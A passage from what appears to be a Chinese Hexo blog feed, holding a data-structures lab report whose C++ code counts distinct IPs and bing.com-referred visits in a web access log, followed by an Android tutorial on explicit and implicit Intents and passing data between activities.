class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ifstream aa;</span><br><span class="line">    aa.<span class="built_in">open</span>(<span class="string">&quot;access.txt&quot;</span>, ios::in);</span><br><span class="line">    <span class="keyword">if</span> (!aa.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;打开文件失败&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">    string buf2;</span><br><span class="line">    <span class="comment">//ip的正则表达式</span></span><br><span class="line">    <span class="function">regex <span class="title">ipPattern</span><span class="params">(<span class="string">&quot;^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9]).)&#123;3&#125;(25[0-5]|2[0-5][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])&quot;</span>)</span></span>;</span><br><span class="line">    <span class="comment">//定义10个字符指针存第二题ip</span></span><br><span class="line">    <span class="keyword">char</span>** ip = <span class="keyword">new</span> <span class="keyword">char</span>* [<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        ip[i] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">20</span>];</span><br><span class="line">    <span class="comment">//定义100个字符指针存第一题ip</span></span><br><span class="line">    <span class="keyword">char</span>** ip_1= <span class="keyword">new</span> <span class="keyword">char</span>* [<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">        ip_1[i] = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">20</span>];</span><br><span class="line">    <span class="comment">//定义一个数组存第二次相同ip的数量</span></span><br><span class="line">    <span class="keyword">int</span> ip_nums[<span class="number">10</span>];</span><br><span class="line">    <span class="comment">//定义第二题不同ip数量</span></span><br><span class="line">    <span class="keyword">int</span> ip_num = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//定义第一题不同ip数量</span></span><br><span class="line">    <span class="keyword">int</span> ip_num_1 = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//第二题相同ip的数量置为0</span></span><br><span class="line">    <span class="built_in">memset</span>(ip_nums, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(ip_nums) );</span><br><span class="line">    <span class="comment">//读取每一行</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">getline</span>(aa, buf2)) &#123;</span><br><span class="line">        <span class="comment">//第一题</span></span><br><span class="line">        string temp1 = <span class="string">&quot;[07/May/2012&quot;</span>;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span>* last1 = <span class="built_in">strstr</span>(buf2.<span class="built_in">c_str</span>(), temp1.<span class="built_in">c_str</span>());</span><br><span class="line">        <span class="keyword">if</span> (last1 != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="comment">//cout &lt;&lt; buf2 &lt;&lt; endl;</span></span><br><span class="line">            smatch result;</span><br><span class="line">            <span class="built_in">regex_search</span>(buf2, result, ipPattern);</span><br><span class="line">            string  matc_ip = result.<span class="built_in">str</span>();</span><br><span class="line">            <span class="comment">//若ip_num_1 ip数量组大于1的话 要进入if遍历是否有相同ip  有的话不用添加 没有的话直接添加</span></span><br><span class="line">            <span class="comment">//小于1 直接添加</span></span><br><span class="line">            <span class="keyword">if</span> (ip_num_1 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> j = <span class="number">0</span>, same_flag = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; ip_num_1; j++) &#123;</span><br><span class="line">                    string temp_ip = ip_1[j];</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strstr</span>(matc_ip.<span class="built_in">c_str</span>(), temp_ip.<span class="built_in">c_str</span>())) &#123;</span><br><span class="line">                        same_flag = <span class="number">1</span>;</span><br><span class="line">                        <span class="comment">/*     cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                             cout &lt;&lt; &quot;存在有ip相同的&quot; &lt;&lt; ip[j] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                             cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (same_flag == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">memcpy</span>(ip_1[ip_num_1++], matc_ip.<span class="built_in">c_str</span>(), <span class="number">20</span>);</span><br><span class="line">                    <span class="comment">/*  cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                      cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                      for (int k = 0; k &lt; ip_num; k++) &#123;</span></span><br><span class="line"><span class="comment">                          cout &lt;&lt; ip[k] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                      &#125;</span></span><br><span class="line"><span class="comment">                      cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/* cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                 cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                             for (int k = 0; k &lt; ip_num_1; k++) &#123;</span></span><br><span class="line"><span class="comment">                                 cout &lt;&lt; ip[k] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                             &#125;</span></span><br><span class="line"><span class="comment">                 cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/</span></span><br><span class="line">                <span class="comment">//将有不同ip赋值到数组中 并且ip_num++</span></span><br><span class="line">                <span class="built_in">memcpy</span>(ip_1[ip_num_1++], matc_ip.<span class="built_in">c_str</span>(), <span class="number">20</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="comment">//第二题</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">3</span>; i &lt;= <span class="number">22</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; <span class="number">10</span>) &#123;</span><br><span class="line">                string temp1 = <span class="string">&quot;0&quot;</span>;</span><br><span class="line">                temp1.<span class="built_in">append</span>(<span class="built_in">to_string</span>(i));</span><br><span class="line">                temp1.<span class="built_in">append</span>(<span class="string">&quot;/May/2012&quot;</span>);</span><br><span class="line">                <span class="comment">//匹配到有该日期的字符串</span></span><br><span class="line">               <span class="keyword">const</span>  <span class="keyword">char</span>* matc_date = <span class="built_in">strstr</span>(buf2.<span class="built_in">c_str</span>(), temp1.<span class="built_in">c_str</span>());</span><br><span class="line">                <span class="keyword">if</span> (matc_date != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    string temp2 = <span class="string">&quot;www.bing.com&quot;</span>;</span><br><span class="line">                    <span class="keyword">const</span> <span class="keyword">char</span>* matc_http = <span class="built_in">strstr</span>(buf2.<span class="built_in">c_str</span>(), temp2.<span class="built_in">c_str</span>());</span><br><span class="line">                    <span class="keyword">if</span> (matc_http != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        smatch result;</span><br><span class="line">                        <span class="built_in">regex_search</span>(buf2, result, ipPattern);</span><br><span class="line">                       string  matc_ip = result.<span class="built_in">str</span>();</span><br><span class="line">                        <span class="keyword">if</span> (ip_num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">int</span> j = <span class="number">0</span>, same_flag = <span class="number">0</span>;</span><br><span class="line">                                        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; ip_num; j++) &#123;</span><br><span class="line">                                            string temp_ip = ip[j];</span><br><span class="line">                                           </span><br><span class="line">                                            <span class="keyword">if</span> (<span class="built_in">strstr</span>(matc_ip.<span class="built_in">c_str</span>(), temp_ip.<span class="built_in">c_str</span>())) &#123;</span><br><span class="line">                                                same_flag = <span class="number">1</span>;</span><br><span class="line">                                           <span class="comment">/*     cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                                cout &lt;&lt; &quot;存在有ip相同的&quot; &lt;&lt; ip[j] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                                cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/</span></span><br><span class="line">                                                ip_nums[j]++;</span><br><span class="line">                                            &#125;  </span><br><span class="line">                                        &#125;</span><br><span class="line">                                       <span class="keyword">if</span>(same_flag==<span class="number">0</span>) &#123;</span><br><span class="line">                                            <span class="built_in">memcpy</span>(ip[ip_num++], matc_ip.<span class="built_in">c_str</span>(), <span class="number">20</span>);</span><br><span class="line">                                          <span class="comment">/*  cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                            cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                            for (int k = 0; k &lt; ip_num; k++) &#123;</span></span><br><span class="line"><span class="comment">                                                cout &lt;&lt; ip[k] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                            &#125;</span></span><br><span class="line"><span class="comment">                                            cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/</span></span><br><span class="line">                                            ip_nums[ip_num - <span class="number">1</span>]++;</span><br><span class="line">                                        &#125;</span><br><span class="line"></span><br><span class="line">                        &#125; <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                           <span class="comment">/* cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                            cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                        for (int k = 0; k &lt; ip_num; k++) &#123;</span></span><br><span class="line"><span class="comment">                                            cout &lt;&lt; ip[k] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                        &#125;</span></span><br><span class="line"><span class="comment">                            cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/</span></span><br><span class="line">                            <span class="built_in">memcpy</span>(ip[ip_num++], matc_ip.<span class="built_in">c_str</span>(), <span class="number">20</span>);</span><br><span class="line">                            ip_nums[ip_num - <span class="number">1</span>]++;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                string temp1 = <span class="built_in">to_string</span>(i);</span><br><span class="line">                temp1.<span class="built_in">append</span>(<span class="string">&quot;/May/2012&quot;</span>);</span><br><span class="line">                <span class="keyword">const</span>  <span class="keyword">char</span>* matc_date = <span class="built_in">strstr</span>(buf2.<span class="built_in">c_str</span>(), temp1.<span class="built_in">c_str</span>());</span><br><span class="line">                <span class="keyword">if</span> (matc_date != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                    string temp2 = <span class="string">&quot;www.bing.com&quot;</span>;</span><br><span class="line">                    <span class="keyword">const</span> <span class="keyword">char</span>* matc_http = <span class="built_in">strstr</span>(buf2.<span class="built_in">c_str</span>(), temp2.<span class="built_in">c_str</span>());</span><br><span class="line">                    <span class="keyword">if</span> (matc_http != <span class="literal">NULL</span>) &#123;</span><br><span class="line">                        <span class="comment">//cout &lt;&lt; buf2 &lt;&lt; endl;</span></span><br><span class="line">                        smatch result;</span><br><span class="line">                        <span class="built_in">regex_search</span>(buf2, result, ipPattern);</span><br><span class="line">                        string  matc_ip = result.<span class="built_in">str</span>();</span><br><span class="line">                        <span class="keyword">if</span> (ip_num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="keyword">int</span> j = <span class="number">0</span>, same_flag = <span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; ip_num; j++) &#123;</span><br><span class="line">                                string temp_ip = ip[j];</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (<span class="built_in">strstr</span>(matc_ip.<span class="built_in">c_str</span>(), temp_ip.<span class="built_in">c_str</span>())) &#123;</span><br><span class="line">                                    same_flag = <span class="number">1</span>;</span><br><span class="line">                                  <span class="comment">/*  cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                    cout &lt;&lt; &quot;存在有ip相同的&quot; &lt;&lt; ip[j] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                    cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/</span></span><br><span class="line">                                    ip_nums[j]++;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (same_flag == <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="built_in">memcpy</span>(ip[ip_num++], matc_ip.<span class="built_in">c_str</span>(), <span class="number">20</span>);</span><br><span class="line">                           <span class="comment">/*     cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                for (int k = 0; k &lt; ip_num; k++) &#123;</span></span><br><span class="line"><span class="comment">                                    cout &lt;&lt; ip[k] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                                &#125;</span></span><br><span class="line"><span class="comment">                                cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/</span></span><br><span class="line">                                ip_nums[ip_num - <span class="number">1</span>]++;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                         <span class="comment">/*   cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                            cout &lt;&lt; &quot;赋值完的ip列表&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                            for (int k = 0; k &lt; ip_num; k++) &#123;</span></span><br><span class="line"><span class="comment">                                cout &lt;&lt; ip[k] &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">                            &#125;</span></span><br><span class="line"><span class="comment">                            cout &lt;&lt; &quot;---------------------&quot; &lt;&lt; endl;*/</span></span><br><span class="line">                            <span class="built_in">memcpy</span>(ip[ip_num++], matc_ip.<span class="built_in">c_str</span>(), <span class="number">20</span>);</span><br><span class="line">                            ip_nums[ip_num - <span class="number">1</span>]++;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">           </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">       </span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">&#125;    </span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;第一题的独立ip数：&quot;</span> &lt;&lt; ip_num_1 &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;------------------------------------&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ip_num; i++) &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;ip：&quot;</span> &lt;&lt; ip[i] &lt;&lt; <span class="string">&quot;，次数：&quot;</span> &lt;&lt; ip_nums[i] &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/09/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C-ip%E9%A2%98%E4%BB%A3%E7%A0%81/image-20200921230642761.png" class="lazyload" data-srcset="/2020/09/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C-ip%E9%A2%98%E4%BB%A3%E7%A0%81/image-20200921230642761.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200921230642761"><img src="/2020/09/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C-ip%E9%A2%98%E4%BB%A3%E7%A0%81/image-20200921230642761.png" class="lazyload" data-srcset="/2020/09/21/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C-ip%E9%A2%98%E4%BB%A3%E7%A0%81/image-20200921230642761.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200921230642761"></p>]]></content>
      
      
      <categories>
          
          <category> 实验报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
            <tag> 实验报告 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android-intent的应用</title>
      <link href="/2020/09/21/Android/Android-intent%E7%9A%84%E5%BA%94%E7%94%A8/"/>
      <url>/2020/09/21/Android/Android-intent%E7%9A%84%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="显式Intent"><a href="#显式Intent" class="headerlink" title="显式Intent"></a>显式Intent</h1><p>创建另一个activity，然后再layout中创建一个新的second_layout</p><p><img src="/2020/09/21/Android/Android-intent%E7%9A%84%E5%BA%94%E7%94%A8/image-20200921233702480.png" class="lazyload" data-srcset="/2020/09/21/Android/Android-intent%E7%9A%84%E5%BA%94%E7%94%A8/image-20200921233702480.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200921233702480"></p><p>其中代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/button_2&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;button2&quot;</span></span></span><br><span class="line"><span class="tag">        /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中&lt;LinerLayout&gt;为该界面内的类，其中声明了一个按钮。</p><p>在AndroidManifest.xml中可以看到有</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.SecondActivity&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>由于SecondActivity不是主窗口 所以不用配置&lt;intent-filter&gt;标签里的内容</p><p><strong>使用显式Intent：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">         <span class="meta">@Override</span></span><br><span class="line">             Intent intent=<span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>, SecondActivity.class);</span><br><span class="line">             startActivity(intent);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;);</span><br></pre></td></tr></table></figure><p><strong>Intent</strong>这个类有多个构造函数，其中一个是<code>Intent(Context packageContext，Class&lt;?&gt;cls)</code></p><p>第一个参数是Context要求提供一个启动活动的上下文，第二个参数Class则是要启动的目标活动</p><p>将该intent类传入startActivity( )方法中，即可启用活动</p><h1 id="隐式Intent"><a href="#隐式Intent" class="headerlink" title="隐式Intent"></a>隐式Intent</h1><p><strong>相对于显式Intent来说，隐式Intent指定一系列更为抽象的action和category信息</strong></p><p>以上面为基础在AndroidManifest.xml中为SecondActivity添加action以及category信息</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.SecondActivity&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.activitytest.ACTION_START&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中声明了该活动可以响应<code>com.example.activitytest.ACTION_START</code>这个action，而对于category中包含了一些附加信息，可以比较精确该活动能响应有带category的。</p><p><strong>只有&lt;action&gt;和&lt;category&gt;同时匹配后，该活动才能进行响应。</strong></p><p>修改FirstActivity中的按钮点击事件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Button button1=(Button)findViewById(R.id.button_1);</span><br><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> Intent(<span class="string">&quot;com.example.activitytest.ACTION_START&quot;</span>);</span><br><span class="line">        intent.addCategory(<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>点击即可运行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">intent.addCategory(<span class="string">&quot;android.intent.category.MY_CATEGORY&quot;</span>);</span><br></pre></td></tr></table></figure><p>如果在其中再添加改行代码，则需要在AndroidManifest.xml中</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.SecondActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.activitytest.ACTION_START&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.MY_CATEGORY&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>category与action同时配对上才能进行调用</p><h1 id="更多关于隐式Intent的调用"><a href="#更多关于隐式Intent的调用" class="headerlink" title="更多关于隐式Intent的调用"></a>更多关于隐式Intent的调用</h1><p>使用Intent调用一个浏览器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">    Intent intent=<span class="keyword">new</span> Intent(Intent.ACTION_VIEW);</span><br><span class="line">    intent.setData(Uri.parse(<span class="string">&quot;http://www.baidu.com&quot;</span>));</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指定了Intent的action是<code>Intent.Action_VIEW</code>，这个是安卓系统内置的action，其常量值为android.intent.action.VIEW,可以通过Uri.Parse( )方法，将一个网址字符串解析成一个Uri对象，在调用setData将该Uri对象传递进去。</p><h1 id="向下一个活动传递数据"><a href="#向下一个活动传递数据" class="headerlink" title="向下一个活动传递数据"></a>向下一个活动传递数据</h1><p>在启动activity的时候传递数据，通过putExtra( )方法重载，需要把我们传递的数据暂存在Intent中，启动后，另一个活动从Intent中取出就有了：</p><p>在FirstActivity中添加代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Button button1=(Button)findViewById(R.id.button_1);</span><br><span class="line">button1.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        String data=<span class="string">&quot;生命诚可贵 爱情价更高&quot;</span>;</span><br><span class="line">        Intent intent=<span class="keyword">new</span> Intent(FirstActivity.<span class="keyword">this</span>,SecondActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;extra_data&quot;</span>,data);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>其中使用了显式Intent，然后使用putExtra将<code>key</code>为<code>extra_data</code>，<code>value</code>为<code>data</code>的数据添加到对象intent</p><p>在SecondActivity中添加代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SecondActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span 